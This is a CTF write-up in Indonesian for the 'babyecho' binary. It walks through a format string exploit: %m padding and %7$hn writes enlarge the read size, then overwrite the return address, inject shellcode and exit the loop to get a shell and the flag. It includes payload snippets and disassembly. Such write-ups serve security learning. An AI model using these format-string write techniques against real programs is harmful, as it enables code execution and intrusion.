# babyecho

**Kategori:** Baby's first
**Points:** 1
**Deskripsi**

## Write-up

Kita diberikan sebuah binary, dan binary ini hanya mengoutputkan balik apa yang kita ketikkan. Pertama kali dijalankan, akan muncul pesan:

      Reading 13 bytes

Jika kita masukkan string `%d`, maka akan muncul `13`, berarti kemungkinan besar ini masalah format string exploit. Hal pertama yang harus kita lakukan adalah memperbesar ukuran input yang akan dibaca oleh, supaya kita bisa mengirimkan string yang lebih panjang. Menengok pada  disassemblynya alamat `esp+0x10` berisi jumlah karakter yang akan dibaca, jika kita bisa mengubah nilai ini, maka berikutnya kita bisa mulai membuat exploit

	08048FB6                 mov     eax, 3FFh
	08048FBB                 cmp     dword ptr [esp+10h], 3FFh
	08048FC3                 cmovle  eax, [esp+10h]
	08048FC8                 mov     [esp+10h], eax
	08048FCC                 mov     eax, [esp+10h]
	08048FD0                 mov     [esp+4], eax
	08048FD4                 mov     dword ptr [esp], offset aReadingDBytes ; "Reading %d bytes\n"
	08048FDB                 call    printf


Kita perlu tahu alamat buffer (yang ada di `esp+0x1c`):

	08048FE0                 mov     dword ptr [esp+8], 0Ah
	08048FE8                 mov     eax, [esp+10h]
	08048FEC                 mov     [esp+4], eax
	08048FF0                 lea     eax, [esp+1Ch]
	08048FF4                 mov     [esp], eax
	08048FF7                 call    readbytes

Penggunaan `%n` tidak diperkenankan (akan diubah oleh program menjadi `_n`), jadi kita perlu memakai `%hn`. Karena buffer sangat kecil, tidak mungkin menggunakan '%p%p%p%p%p%p' agar kurang dari 13 karakter. Butuh agak lama bagi saya untuk menemukan tentang penggunaan `%$` untuk indexing parameter pada `printf`. Saya menggunakan cara sederhana untuk mengekspand buffernya: pertama cari tahu dulu alamat buffernya dengan `%d%d%d%d%p`, lalu saya kurangi dengan `0xc` (karena ada di `[esp+0x10]`), 

     tosend = q(stack-0xc) + "%m%7$hn\n"

Saya memakai fungsi `q` sebagai shortcut saja untuk:

```python
def q(a):
  return struct.pack("I", a)
```

Seharusnya ada cara yang lebih cepat untuk mengekspand buffer, tapi cara itu yang terpikir pertama kali oleh saya. Format `%m` akan memprint error message yang cukup panjang, dengan itu panjang yang akan dibaca menjadi 29 bytes:

      Reading 29 bytes
      
Saya ulangi lagi dengan `%m` yang lebih banyak:

```python
tosend = q(stack-0xc) + "%m" * 9 +  "%7$hn\n"
```

      Reading 229 bytes
      
Dan sekali lagi:      

```python
tosend = q(stack-0xc) + "%m" * 44 +  "%7$hn\n"
```

      Reading 1023 bytes

Berikutnya kita perlu mengubah return address, supaya ketika fungsi ini keluar, maka kode shell kita yang akan dipanggil. Karena kita bisa mengirimkan format string berkali-kali, maka saya ubah satu byte demi satu byte. Terakhir kita perlu keluar dari loop

	08049027                 call    _alarm
	0804902C
	0804902C loc_804902C:                            ; CODE XREF: main+78 ^
	0804902C                 cmp     dword ptr [esp+18h], 0
	08049031                 jz      short loc_8048FB6

Kita akan keluar dari loop jika `esp+0x18` bernilai tidak 0, jadi kita tidak peduli nilainya asalkan bukan 0. Terakhir saya kirimkan shell code bersama dengan format string untuk mengeset `esp+0x18` dengan nilai non-zero:

```python
tosend = q(stack-0xc+0x8) + shell + "%7$hn---\n"
```

Sekarang setelah mendapatkan shell, kita bisa mencari tahu di mana flagnya:

	ls /
	ls /home/
	ls /home/babyecho/
	cat /home/babyecho/flag

Dan flagnya:

     The flag is: 1s 1s th3r3 th3r3 @n @n 3ch0 3ch0 1n 1n h3r3 h3r3? 3uoiw!T0*%
